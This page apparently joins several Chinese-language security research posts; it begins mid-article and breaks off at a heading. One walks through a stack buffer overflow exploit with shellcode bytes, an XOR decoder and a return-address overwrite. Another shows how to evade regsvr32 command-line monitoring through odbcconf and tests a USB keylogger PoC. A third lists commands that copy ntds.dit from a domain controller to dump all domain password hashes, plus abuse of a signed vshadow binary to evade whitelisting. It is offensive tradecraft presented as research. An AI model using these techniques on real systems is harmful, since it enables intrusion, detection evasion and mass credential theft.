<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>测试系统：Win XP

编译器：VC6.0

build版本： debug版本
</code></pre></div></div>

<p><strong>(1) 分析并调试程序，获得淹没返回地址的偏移</strong></p>

<p>可在password.txt中填入56个测试字符，使用OllyDbg打开程序，定位到函数返回地址</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-2-24/2-0.png" alt="Alt text"></p>

<p>返回地址刚好被覆盖</p>

<p><strong>(2) 获得buffer的起始地址并覆盖返回地址</strong></p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-2-24/2-1.png" alt="Alt text"></p>

<p>获得buffer的起始地址：<code class="language-plaintext highlighter-rouge">0012FB7C</code></p>

<p><strong>注：</strong></p>

<p>在不同系统下buffer的起始地址不同</p>

<p>使用0012FB7C覆盖返回地址，即password.txt的53-56位的十六进制字符为7CFB1200(逆序保存)</p>

<p><strong>(3) 提取弹框操作的机器码</strong></p>

<p>参照《0day安全：软件漏洞分析技术》中的方法，使用Dependency Walker 获取ueser32.ll的基地址为0x77D10000
MessageBoxA的偏移地址为0x000407EA</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-2-24/2-2.png" alt="Alt text"></p>

<p>因此MessageBoxA在该系统上内存中的入口地址为0x77D10000+0x000407EA=0x77D507EA</p>

<p>替换书中MessageBoxA对应函数入口地址的机器码</p>

<p>最终password.txt内容如下(十六进制视图)：</p>

<p>00000000h: 33 DB 53 68 77 65 73 74 68 66 61 69 6C 8B C4 53 ; 3跾hwesthfail嬆S
00000010h: 50 50 53 B8 EA 07 D5 77 FF D0 90 90 90 90 90 90 ; PPS戈.誻袗悙悙?
00000020h: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 ; 悙悙悙悙悙悙悙悙
00000030h: 90 90 90 90 7C FB 12 00                         ; 悙悙|?.</p>

<p>最终程序运行如图，栈溢出在我们的测试系统上触发成功</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-2-24/2-3.png" alt="Alt text"></p>

<h2 id="0x03-弹框实例shellcode在栈溢出的优化">0x03 弹框实例shellcode在栈溢出的优化</h2>
<hr>

<p>上节简单介绍了一下栈溢出实例的原理和操作方法，本节将要介绍如何优化我们自己开发的shellcode，即弹框实例shellcode，结合具体漏洞，实现利用</p>

<p>弹框实例shellcode下载地址：</p>

<p>https://github.com/3gstudent/Shellcode-Generater/blob/master/shellcode.bin</p>

<p>shellcode长度1536</p>

<p><strong>(1) 修改实例程序，使其数组足以保存我们的shellcode</strong></p>

<p>完整代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;
#define PASSWORD "1234567"

int verify_password (char *password)
{
	int authenticated;
	char buffer[1556];
	authenticated=strcmp(password,PASSWORD);
	strcpy(buffer,password);
	return authenticated;
}

int main()
{
	int valid_flag=0;
	char password[2048]={0};
	FILE *fp;
	if(!(fp=fopen("password2.txt","rb")))
		return 0;
	fread(password,1568,1,fp);
	valid_flag=verify_password(password);
	if(valid_flag)
	{
		printf("wrong\n");
	}
	else
	{
		printf("right\n");
	}
	fclose(fp);
	return 0;
}
</code></pre></div></div>

<p>buffer长度增大到1556，用于保存弹框实例shellcode</p>

<p>根据上节实例，淹没返回地址的偏移9-12，因此password的长度增加到1556+12=1568</p>

<p><strong>(2) strcpy遇到字符00会截断</strong></p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-2-24/2-4.png" alt="Alt text"></p>

<p>弹框实例shellcode在00000009h处字符为0x00，strcpy在执行时遇到0x00会提前截断，导致shellcode不完整，无法覆盖返回地址</p>

<p>所以，需要对shellcode进行编码</p>

<p>为方便读者理解，参照《0day安全：软件漏洞分析技术》中3.5.2节的方法(此章节有详细说明，不再赘述过程)：</p>

<ul>
  <li>shellcode尾部添加结束字符0x90</li>
  <li>将shellcode逐字节同0x44作异或加密</li>
  <li>汇编实现解码器并提取机器码</li>
  <li>解码器的机器码放于shellcode首部</li>
  <li>解码器将EAX对准shellcode起始位置，逐字节同0x44异或进行解密，遇到0x90停止</li>
</ul>

<p>解码器的汇编代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>void main()
{
	__asm
	{
		add eax,0x14
		xor ecx,ecx
decode_loop:
		mov bl,[eax+ecx]
		xor bl,0x44
		mov [eax+ecx],bl
		inc ecx
		cmp bl,0x90
		jne decode_loop
	}
}
</code></pre></div></div>

<p>使用OllyDbg提取出机器码如下：</p>

<p><code class="language-plaintext highlighter-rouge">"\x83\xC0\x14\x33\xC9\x8A\x1C\x08\x80\xF3\x44\x88\x1C\x08\x41\x80\xFB\x90\x75\xF1"</code></p>

<p>新的shellcode格式如下：</p>

<p>解码器机器码+加密的弹框实例<code class="language-plaintext highlighter-rouge">shellcode+0xD4+"\x90\x90\x90\x90\x90\x90\x90"+"\x7C\xFB\x12\x00"</code></p>

<p><strong>注：</strong></p>

<p>0x90^0x44=0xD4,0xD4即编码后的结束字符</p>

<p>“\x90\x90\x90\x90\x90\x90\x90”为填充字符串，无意义</p>

<p>“\x7C\xFB\x12\x00”为覆盖的函数返回地址</p>

<p><strong>(3) 0xD4冲突</strong></p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-2-24/2-5.png" alt="Alt text"></p>

<p>弹框实例shellcode中也包含结束字符0xD4，解密时shellcode会被提前截断，所以需要选择一个新的结束字符</p>

<p>当然也可以对shellcode分段加密，针对此shellcode，恰巧0xD5未出现，因此使用0xD5作结束字符串即可，解密字符为0x91</p>

<p>修改后的机器码如下：</p>

<p><code class="language-plaintext highlighter-rouge">"\x83\xC0\x14\x33\xC9\x8A\x1C\x08\x80\xF3\x44\x88\x1C\x08\x41\x80\xFB\x91\x75\xF1"</code></p>

<p>修改后的shellcode格式如下：</p>

<p><code class="language-plaintext highlighter-rouge">解码器机器码+加密的弹框实例shellcode+0xD5+"\x90\x90\x90\x90\x90\x90\x90"+"\x7C\xFB\x12\x00"</code></p>

<p><strong>(4) shellcode编码测试</strong></p>

<p>编写程序实现自动读取原shellcode，加密，添加解密机器码，添加结束字符</p>

<p>程序已上传至github</p>

<p>https://github.com/3gstudent/Shellcode-Generater/blob/master/enshellcode.cpp</p>

<p>执行后如图，产生新的shellcode文件，并在屏幕输出c格式的shellcode</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-2-24/2-6.png" alt="Alt text"></p>

<p>使用如下代码，结合屏幕输出c格式的shellcode，替换数组内容，对新的加密shellcode测试</p>

<p>由于代码较长，所以上传至github，地址如下：</p>

<p>https://github.com/3gstudent/Shellcode-Generater/blob/master/testenshellcode.cpp</p>

<p>如图，shellcode执行，成功实现解码器</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-2-24/2-7.png" alt="Alt text"></p>

<p><strong>(5) 新shellcode在栈溢出中的测试</strong></p>

<p>填上解码器机器码，完整的shellcode格式如下：</p>

<p><code class="language-plaintext highlighter-rouge">"\x83\xC0\x14\x33\xC9\x8A\x1C\x08\x80\xF3\x44\x88\x1C\x08\x41\x80\xFB\x91\x75\xF1"+加密的弹框实例shellcode+0xD5+"\x90\x90\x90\x90\x90\x90\x90"+"\x7C\xFB\x12\x00"</code></p>

<p>在栈溢出测试程序中仍然报错，使用OllyDbg加载继续调试</p>

<p>如下图，成功覆盖函数返回地址，接着按F8进行单步调试</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-2-24/2-8.png" alt="Alt text"></p>

<p>如下图，此时发现异常，EAX寄存器的值为909090D5，正常情况下EAX的值应该为Buffer的起始地址，这样才能成功找到shellcode并对其解密</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-2-24/2-9.png" alt="Alt text"></p>

<p>而寄存器EDX却保存了Buffer的起始地址</p>

<p>所以，我们需要对解码器作修改</p>

<p><strong>(6) 修改解码器</strong></p>

<p>选择一个最简单直接的方法，将EDX对准shellcode的起始位置，实现的汇编代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>void main()
{
	__asm
	{
		add edx,0x14
		xor ecx,ecx
decode_loop:
		mov bl,[edx+ecx]
		xor bl,0x44
		mov [edx+ecx],bl
		inc ecx
		cmp bl,0x90
		jne decode_loop

	}
}
</code></pre></div></div>

<p>在OllyDbg中加载程序并提取机器码，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-2-24/2-10.png" alt="Alt text"></p>

<p>新的解码器机器码为：</p>

<p><code class="language-plaintext highlighter-rouge">"\x83\xC2\x14\x33\xC9\x8A\x1C\x0A\x80\xF3\x44\x88\x1C\x0A\x41\x80\xFB\x91\x75\xF1"  </code></p>

<p>最终的shellcode代码为：</p>

<p><code class="language-plaintext highlighter-rouge">"\x83\xC2\x14\x33\xC9\x8A\x1C\x0A\x80\xF3\x44\x88\x1C\x0A\x41\x80\xFB\x91\x75\xF1"+加密的弹框实例shellcode+0xD5+"\x90\x90\x90\x90\x90\x90\x90"+"\x7C\xFB\x12\x00"</code></p>

<p>完整shellcode代码已上传至github，地址为：</p>

<p>https://github.com/3gstudent/Shellcode-Generater/blob/master/stackoverflowshellcode.bin</p>

<p>再次测试栈溢出，如图，shellcode成功执行</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-2-24/2-11.png" alt="Alt text"></p>

<p>由于shellcode是我们自己实现的动态获取API地址，所以栈溢出测试程序中的LoadLibrary(“user32.dll”); 可以省略</p>

<h2 id="0x04-小结">0x04 小结</h2>
<hr>

<p>本文对栈溢出原理作了简要描述，着重介绍了在具体的栈溢出环境下，shellcode的优化、调试和利用技巧</p>

<p>当然，上述shellcode存在一个不足：shellcode在内存中的起始地址往往不固定，导致漏洞利用不一定成功</p>

<p>下一篇文章将要解决这个问题</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on February 24, 2017
  </div>

  
</article><article class="post">
  <h1>Study Notes Weekly No.3(Use odbcconf to load dll &amp; Get-Exports &amp; ETW USB Keylogger)</h1>

  <div class="entry">
    <p><strong>About:</strong></p>

<ul>
  <li>
    <p>Use odbcconf to load dll</p>
  </li>
  <li>
    <p>Use powershell to get dll exports</p>
  </li>
  <li>
    <p>Use Event Tracing for Windows to log keystrokes from USB keyboards</p>
  </li>
</ul>

<p><strong>目录：</strong></p>

<ul>
  <li>
    <p>介绍为什么通过odbcconf加载dll可以绕过在命令行下对regsvr32的拦截</p>
  </li>
  <li>
    <p>比ExportsToC++更方便的批量输出dll导出函数的工具——ExportsToC++</p>
  </li>
  <li>
    <p>通过ETW实现对USB键盘的键盘记录，记录测试心得</p>
  </li>
</ul>

<h2 id="0x01-use-odbcconf-to-load-dll">0x01 Use odbcconf to load dll</h2>
<hr>

<p><strong>Reference:</strong></p>

<p>https://twitter.com/subTee/status/789459826367606784</p>

<h3 id="简介">简介</h3>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-26/1-1.png" alt="Alt text"></p>

<p>如图，Casey Smith在twitter分享的一个技巧，如果将执行regsvr32加载dll的代码写在.rsp文件中，再通过odbcconf.exe去调用，这样可以绕过在命令行下对regsvr32的拦截。本文将要介绍为什么可以绕过在命令行下对regsvr32的拦截。</p>

<p><strong>odbcconf：</strong></p>

<p>用于配置ODBC驱动和数据源</p>

<p>详细说明见如下链接：</p>

<p>https://msdn.microsoft.com/en-us/library/ee388579(v=vs.85).aspx</p>

<p>用法如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-26/2-1.png" alt="Alt text"></p>

<p>值得注意的是odbcconf包含一个注册dll的功能，我在之前的文章《Code Execution of Regsvr32.exe》中具体介绍过如何开发可被regsvr32调用的dll，编写一个测试dll进行测试(此处略，不再重复介绍)。</p>

<p>cmd下运行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>odbcconf.exe /a {regsvr c:\test\odbcconf.dll}
</code></pre></div></div>

<p>如图，成功调用dll，弹出对话框</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-26/2-2.png" alt="Alt text"></p>

<p>站在防御者的角度，为了防止利用regsvr32调用dll的方法被滥用，常常会选择监控命令行的输入(如通过EMET创建规则),只要发现命令行中包括regsvr的字符就会对其拦截</p>

<p>当然，上述操作包含了字符regsvr，将会被拦截</p>

<p>使用Process Explorer查看odbcconf进程的命令行，包含字符<code class="language-plaintext highlighter-rouge">regsvr</code></p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-26/2-3.png" alt="Alt text"></p>

<p>但是，使用odbcconf的另一个功能却可以绕过，那就是/F参数</p>

<p><strong>用法：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>odbcconf.exe /f my.rsp
</code></pre></div></div>

<p>my.rsp为响应文件，里面包含执行的操作：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REGSVR c:\test\odbcconf.dll
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>这里需要填入dll的绝对路径</p>

<p>如图，成功调用dll，弹出对话框</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-26/2-4.png" alt="Alt text"></p>

<p>使用Process Explorer再次查看命令行，不包含字符regsvr</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-26/2-5.png" alt="Alt text"></p>

<p>NickTyrer根据这个方法分享了他的代码，实现了在dll中运行powershell命令，地址如下：</p>

<p>https://gist.github.com/NickTyrer/6ef02ce3fd623483137b45f65017352b</p>

<p>编译工程之前，需要如下设置：</p>

<ul>
  <li>
    <p>设置编译平台为x86或者x64</p>
  </li>
  <li>
    <p>安装UnmanagedExports和System.Management.Automation
在Visual Studio控制面板选择TOOLS-Library Package Manager-Package Manager Console，输入：
Install-Package UnmanagedExports
Install-Package System.Management.Automation</p>
  </li>
</ul>

<h2 id="0x02-use-powershell-to-get-dll-exports">0x02 Use powershell to get dll exports</h2>
<hr>

<p><strong>Reference:</strong></p>

<p>https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Get-Exports.ps1</p>

<h3 id="简介-1">简介</h3>

<p>在<a href="https://3gstudent.github.io/3gstudent.github.io/Study-Notes-Weekly-No.1(Monitor-WMI_ExportsToC++_Use-DiskCleanup-bypass-UAC)">《Study-Notes-Weekly-No.1(Monitor-WMI-ExportsToC++-Use-DiskCleanup-bypass-UAC)》</a>介绍过一款批量输出dll导出函数的工具——ExportsToC++ ，运行的前提是需要.NET Framework 2.0和安装Microsoft Visual Studio</p>

<p>b33f@FuzzySecurity对此作了改进，开源了powershell下的Get-Exports，特点是不再需要Microsoft Visual Studio的开发环境，更简便快捷，同时支持32位和64位的dll</p>

<p>测试代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Exports -DllPath c:\Windows\system32\dimsjob.dll -ExportsToCpp C:\test\export.txt
</code></pre></div></div>

<p>运行后如图，显示导出函数信息</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-26/3-1.png" alt="Alt text"></p>

<p>同时生成可供使用的c++代码并保存在C:\test\export.txt下，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-26/3-2.png" alt="Alt text"></p>

<h2 id="0x03-use-event-tracing-for-windows-to-log-keystrokes-from-usb-keyboards">0x03 Use Event Tracing for Windows to log keystrokes from USB keyboards</h2>
<hr>
<p><strong>Reference:</strong></p>

<p>https://www.cyberpointllc.com/srt/posts/srt-logging-keystrokes-with-event-tracing-for-windows-etw.html</p>

<h3 id="简介-2">简介</h3>

<p>CyberPoint SRT在Ruxcon介绍了他们对ETW的新用法，实现了对USB键盘的键盘记录，并且公布了一个测试POC，本文将对其进行测试，分析测试心得。</p>

<p><strong>ETW：</strong></p>

<ul>
  <li>
    <p>是Event Tracing for Windows的缩写</p>
  </li>
  <li>
    <p>提供了一种对用户层应用程序和内核层驱动创建的事件对象的跟踪记录机制</p>
  </li>
  <li>
    <p>通常用于协助管理员和开发人员解决和测量系统和应用程序的性能</p>
  </li>
  <li>
    <p>公开资料显示尚未有利用ETW实现键盘记录的方法</p>
  </li>
</ul>

<p>介绍ETW的一些学习资料：</p>

<p>https://randomascii.wordpress.com/2015/09/24/etw-central/</p>

<p>POC下载地址：</p>

<p>https://github.com/CyberPoint/Ruxcon2016ETW/tree/master/KeyloggerPOC</p>

<p><strong>注：</strong></p>

<p>该POC已经被杀毒软件查杀，测试需要放行</p>

<p>要求：</p>

<ul>
  <li>Windows 7  (USB 2.0)</li>
  <li>Windows 8+(USB 2.0 and USB 3.0)</li>
  <li>管理员权限运行</li>
</ul>

<p><strong>注：</strong></p>

<p>不支持PS/2接口的键盘</p>

<p>测试环境：</p>

<ul>
  <li>Win8.1 x86</li>
  <li>vs2013</li>
  <li>安装.NET Framework .net 4.5.2</li>
  <li>Install-Package Microsoft.Diagnostics.Tracing.TraceEvent</li>
  <li>USB 2.0的键盘</li>
</ul>

<p>管理员权限运行exe，记录测试如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-26/4-1.png" alt="Alt text"></p>

<p>POC最大的不足：</p>

<ul>
  <li>记录存在延迟</li>
  <li>不稳定，常常报错[!] ignoring non-usb keyboard device: 0xFFFFFFFF8CFF6070</li>
</ul>

<p>从POC到工具还有很长的的一段路要走，但这个思路值得学习，ETW的利用方法值得总结，期待CyberPoint SRT的后续文章</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

  </div>

  <div class="date">
    Written on October 26, 2016
  </div>

  
</article><article class="post">
  <h1>域渗透——获得域控服务器的NTDS.dit文件</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在之前的文章《导出当前域内所有用户hash的技术整理》曾介绍过通过Volume Shadow Copy实现对ntds.dit文件的复制， 可用来导出域内所有用户hash。本文将尝试做系统总结，总结多种不同的方法。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>多种实现方法</li>
  <li>比较优缺点</li>
</ul>

<h2 id="0x02-通过volume-shadow-copy获得域控服务器ntdsdit文件">0x02 通过Volume Shadow Copy获得域控服务器NTDS.dit文件</h2>
<hr>

<p>测试系统：</p>

<ul>
  <li>Server 2008 R2 x64</li>
  <li>Server 2012 R2 x64</li>
</ul>

<p><strong>Volume Shadow Copy Service：</strong></p>

<ul>
  <li>用于数据备份</li>
  <li>支持Windows Server 2003 及以上操作系统</li>
  <li>系统默认在特定条件下自动创建数据备份，如补丁安装后。在Win7系统大概每隔一周自动创建备份，该时间无法确定</li>
  <li>禁用VSS会影响系统正常使用，如 System Restore和 Windows Server Backup</li>
</ul>

<h3 id="1ntdsutil">1、ntdsutil</h3>

<p>域环境默认安装</p>

<p>支持系统：</p>

<ul>
  <li>Server 2003</li>
  <li>Server 2008</li>
  <li>Server 2012</li>
  <li>…</li>
</ul>

<h4 id="常用命令">常用命令：</h4>

<p>(1) 查询当前快照列表</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntdsutil snapshot "List All" quit quit
</code></pre></div></div>

<p>(2) 查询已挂载的快照列表</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntdsutil snapshot "List Mounted" quit quit
</code></pre></div></div>

<p>(3) 创建快照</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntdsutil snapshot "activate instance ntds" create quit quit
</code></pre></div></div>

<p>(4) 挂载快照</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntdsutil snapshot "mount GUID" quit quit
</code></pre></div></div>

<p>(5) 卸载快照:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntdsutil snapshot "unmount GUID" quit quit
</code></pre></div></div>

<p>(6) 删除快照</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntdsutil snapshot "delete GUID" quit quit
</code></pre></div></div>

<h4 id="实际测试">实际测试：</h4>

<p>(1) 查询当前系统的快照</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntdsutil snapshot "List All" quit quit
ntdsutil snapshot "List Mounted" quit quit
</code></pre></div></div>

<p>(2) 创建快照</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntdsutil snapshot "activate instance ntds" create quit quit
</code></pre></div></div>

<p>guid为<code class="language-plaintext highlighter-rouge">{6e31c0ab-c517-420b-845d-c38acbf77ab9}</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-27/2-1.png" alt="Alt text"></p>

<p>(3) 挂载快照</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntdsutil snapshot "mount {6e31c0ab-c517-420b-845d-c38acbf77ab9}" quit quit
</code></pre></div></div>

<p>快照挂载为<code class="language-plaintext highlighter-rouge">C:\$SNAP_201802270645_VOLUMEC$\</code>，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-27/2-2.png" alt="Alt text"></p>

<p>(4) 复制ntds.dit</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy C:\$SNAP_201802270645_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit
</code></pre></div></div>

<p>(5) 卸载快照:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntdsutil snapshot  "unmount {6e31c0ab-c517-420b-845d-c38acbf77ab9}" quit quit
</code></pre></div></div>

<p>(6) 删除快照</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntdsutil snapshot  "delete {6e31c0ab-c517-420b-845d-c38acbf77ab9}" quit quit
</code></pre></div></div>

<h3 id="2vssadmin">2、vssadmin</h3>

<p>域环境默认安装</p>

<p>支持系统：</p>

<ul>
  <li>Server 2008</li>
  <li>Server 2012</li>
  <li>…</li>
</ul>

<h4 id="常用命令-1">常用命令：</h4>

<p>(1) 查询当前系统的快照</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vssadmin list shadows
</code></pre></div></div>

<p>(2) 创建快照</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vssadmin create shadow /for=c:
</code></pre></div></div>

<p>(3) 删除快照</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vssadmin delete shadows /for=c: /quiet
</code></pre></div></div>

<h4 id="实际测试-1">实际测试：</h4>

<p>(1) 查询当前系统的快照</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vssadmin list shadows
</code></pre></div></div>

<p>(2) 创建快照</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vssadmin create shadow /for=c:
</code></pre></div></div>

<p>获得Shadow Copy Volume Name为<code class="language-plaintext highlighter-rouge">\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-27/2-3.png" alt="Alt text"></p>

<p>(3) 复制ntds.dit</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12\windows\NTDS\ntds.dit c:\ntds.dit
</code></pre></div></div>

<p>(4) 删除快照</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vssadmin delete shadows /for=c: /quiet
</code></pre></div></div>

<h3 id="3vshadowexe">3、vshadow.exe</h3>

<p>系统默认不支持,，可在Microsoft Windows Software Development Kit (SDK)中获得该工具</p>

<p><strong>注：</strong></p>

<p>64位系统需要使用64位的vshadow.exe</p>

<p>不同系统可供使用的vshadow.exe下载地址：</p>

<p>http://edgylogic.com/blog/vshadow-exe-versions/</p>

<h4 id="常用命令-2">常用命令：</h4>

<p>(1) 查询当前系统的快照</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vshadow.exe -q
</code></pre></div></div>

<p>(2) 创建快照</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vshadow.exe -p -nw C:
</code></pre></div></div>

<p>参数说明：</p>

<p>-p persistent，备份操作或是重启系统不会删除</p>

<p>-nw no writers，用来提高创建速度</p>

<p>C: 对应c盘</p>

<p>(3) 删除快照</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vshadow -dx=ShadowCopySetId

vshadow -ds=ShadowCopyId
</code></pre></div></div>

<h4 id="实际测试-2">实际测试：</h4>

<p>(1) 查询当前系统的快照</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vshadow.exe -q
</code></pre></div></div>

<p>(2) 创建快照</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vshadow.exe -p -nw C:
</code></pre></div></div>

<p>获得SnapshotSetID为<code class="language-plaintext highlighter-rouge">{809b77cc-cf9a-4101-b802-08e97d10e613}</code></p>

<p>获得SnapshotID为<code class="language-plaintext highlighter-rouge">{ef99d039-9a38-4e8b-9f57-e3113d464f76}</code></p>

<p>获得Shadow copy device name为<code class="language-plaintext highlighter-rouge">\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-27/2-4.png" alt="Alt text"></p>

<p>(3) 复制ntds.dit</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10\windows\NTDS\ntds.dit c:\ntds.dit
</code></pre></div></div>

<p>(4) 删除快照</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vshadow -dx={809b77cc-cf9a-4101-b802-08e97d10e613}
</code></pre></div></div>

<p>or</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vshadow -ds={ef99d039-9a38-4e8b-9f57-e3113d464f76}
</code></pre></div></div>

<h3 id="4vssownvbs">4、vssown.vbs</h3>

<p>可供参考的下载地址：</p>

<p>https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs</p>

<p>本质上是通过wmi对ShadowCopy进行操作</p>

<p>通过wmi查询快照信息：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic /NAMESPACE:"\\root\CIMV2" PATH Win32_ShadowCopy GET DeviceObject,ID,InstallDate /FORMAT:list
</code></pre></div></div>

<p>powershell实现：</p>

<p>https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1</p>

<h3 id="扩展">扩展</h3>

<h4 id="1日志文件">1、日志文件</h4>

<p>调用Volume Shadow Copy服务会产生日志文件，位于System下，Event ID为7036</p>

<p>执行<code class="language-plaintext highlighter-rouge">ntdsutil snapshot "activate instance ntds" create quit quit</code>会额外产生Event ID为98的日志文件</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-27/2-5.png" alt="Alt text"></p>

<h4 id="2访问快照中的文件">2、访问快照中的文件</h4>

<p>查看快照列表：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vssadmin list shadows
</code></pre></div></div>

<p>无法直接访问<code class="language-plaintext highlighter-rouge">\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12</code>中的文件</p>

<p>可通过创建符号链接访问快照中的文件：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mklink /d c:\testvsc \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12\
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-27/2-6.png" alt="Alt text"></p>

<p>删除符号链接：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rd c:\testvsc
</code></pre></div></div>

<p>利用思路：</p>

<p>如果当前系统存在快照文件，可对系统的历史文件进行访问</p>

<h4 id="3利用vshadow执行命令">3、利用vshadow执行命令</h4>

<p>参考资料：</p>

<p>https://bohops.com/2018/02/10/vshadow-abusing-the-volume-shadow-service-for-evasion-persistence-and-active-directory-database-extraction/</p>

<p>执行命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vshadow.exe -nw -exec=c:\windows\system32\notepad.exe c:
</code></pre></div></div>

<p>执行后，后台存在进程VSSVC.exe，同时显示服务Volume Shadow Copy正在运行，需要手动关闭进程VSSVC.exe</p>

<p><strong>注：</strong></p>

<p>手动关闭进程VSSVC.exe会生成日志7034</p>

<p>利用思路：</p>

<p>vshadow.exe包含微软签名，能绕过某些白名单的限制。如果作为启动项，Autoruns的默认启动列表不显示</p>

<h2 id="0x03-通过ninjacopy获得域控服务器ntdsdit文件">0x03 通过NinjaCopy获得域控服务器NTDS.dit文件</h2>
<hr>

<p>下载地址：</p>

